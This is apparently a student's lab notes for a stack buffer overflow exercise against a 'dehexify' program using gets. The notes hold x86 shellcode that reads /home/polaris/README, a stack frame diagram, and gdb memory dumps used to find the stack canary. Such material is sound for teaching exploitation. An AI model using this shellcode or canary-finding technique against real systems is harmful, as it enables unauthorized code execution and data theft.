


SHELLCODE = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2" \
"\xeb\x32\x5b\xb0\x05\x31\xc9\xcd" \
"\x80\x89\xc6\xeb\x06\xb0\x01\x31" \
"\xdb\xcd\x80\x89\xf3\xb0\x03\x83" \
"\xec\x01\x8d\x0c\x24\xb2\x01\xcd" \
"\x80\x31\xdb\x39\xc3\x74\xe6\xb0" \
"\x04\xb3\x02\xb2\x01\xcd\x80\x83" \
"\xc4\x01\xeb\xdf\xe8\xc9\xff\xff" \
"\xff/home/polaris/README\x00"

----- Q3 Polaris Stack Diagram -----

[4] RIP of main
[4] SFP of main
[4] canary
[n] compiler padding unknown bytes n
*now in dehexify*
[4] RIP/EIP of dehexify @0xbffffb50
[4] SFP/EBP of dehexify @0xbffffb4c
[8 bytes of m] (note ebx @ b48, 4 after canary as size of canary is 4)
[4] canary @0xbffffb44 (NOTE b4c - b44 = 8) (NOTE b44 - b34 = 10)
[10 bytes of n]
[16] char buffer @0xbffffb34
[16] char answer @0xbffffb24
...





ATTACK ON GETS(C.BUFFER) [19]
Breakpoint 1, dehexify () at dehexify.c:19
(gdb) i f
Stack level 0, frame at 0xbffffb54:
 eip = 0x401301 in dehexify (dehexify.c:19); saved eip = 0x401409
 called by frame at 0xbffffb60
 source language c.
 Arglist at 0xbffffb4c, args:
 Locals at 0xbffffb4c, Previous frame's sp is 0xbffffb54
 Saved registers:
  ebx at 0xbffffb48, ebp at 0xbffffb4c, eip at 0xbffffb50


  EIP = RIP = 0xbffffb50
  EBP = SFP = 0xbffffb4c
  RIP - CANARY = 0xbffffb50 - 0xbffffb44 = C or 12

  Starting program: /home/polaris/dehexify
  Breakpoint 1, dehexify () at dehexify.c:19
  (gdb) x/32x c.buffer
  0xbffffb34:     0x00000000      0x00000000      0x00000000      0x00000000
  0xbffffb44:     0xa8623bf3      0x00403fb4      0xbffffb58      0x00401409
  0xbffffb54:     0xb7ffcf88      0xbffffbdc      0xb7f82ef2      0x00000001
  0xbffffb64:     0xbffffbd4      0xbffffbdc      0xb7fff090      0x00000011
  0xbffffb74:     0x00000000      0xb7f82ed0      0x00403fb4      0xb7ffea20
  0xbffffb84:     0xb7ffec40      0x00000000      0x004010fd      0x004013f3
  0xbffffb94:     0x00000001      0xbffffbd4      0x00401000      0x00401491
  0xbffffba4:     0x00000000      0xb7fc675b      0x00000000      0x00000000
  Start it from the beginning? (y or n) y
  Starting program: /home/polaris/dehexify
  Breakpoint 1, dehexify () at dehexify.c:19
  (gdb) x/32x c.buffer
  0xbffffb34:     0x00000000      0x00000000      0x00000000      0x00000000
  0xbffffb44:     0x08f2be14      0x00403fb4      0xbffffb58      0x00401409
  0xbffffb54:     0xb7ffcf88      0xbffffbdc      0xb7f82ef2      0x00000001
  0xbffffb64:     0xbffffbd4      0xbffffbdc      0xb7fff090      0x00000011
  0xbffffb74:     0x00000000      0xb7f82ed0      0x00403fb4      0xb7ffea20
  0xbffffb84:     0xb7ffec40      0x00000000      0x004010fd      0x004013f3
  0xbffffb94:     0x00000001      0xbffffbd4      0x00401000      0x00401491
  0xbffffba4:     0x00000000      0xb7fc675b      0x00000000      0x00000000

  Start it from the beginning? (y or n) y
  Starting program: /home/polaris/dehexify
  Breakpoint 1, dehexify () at dehexify.c:19
  (gdb) x/32x c.buffer
  0xbffffb34:     0x00000000      0x00000000      0x00000000      0x00000000
  0xbffffb44:     0x6ecdb6f4      0x00403fb4      0xbffffb58      0x00401409
  0xbffffb54:     0xb7ffcf88      0xbffffbdc      0xb7f82ef2      0x00000001
  0xbffffb64:     0xbffffbd4      0xbffffbdc      0xb7fff090      0x00000011
  0xbffffb74:     0x00000000      0xb7f82ed0      0x00403fb4      0xb7ffea20
  0xbffffb84:     0xb7ffec40      0x00000000      0x004010fd      0x004013f3
  0xbffffb94:     0x00000001      0xbffffbd4      0x00401000      0x00401491
  0xbffffba4:     0x00000000      0xb7fc675b      0x00000000      0x00000000

Can see change@0xbffffb44 (shifts from a8623bf3 to 08f2be14 to 6ecdb6f4) so that is our CANARY
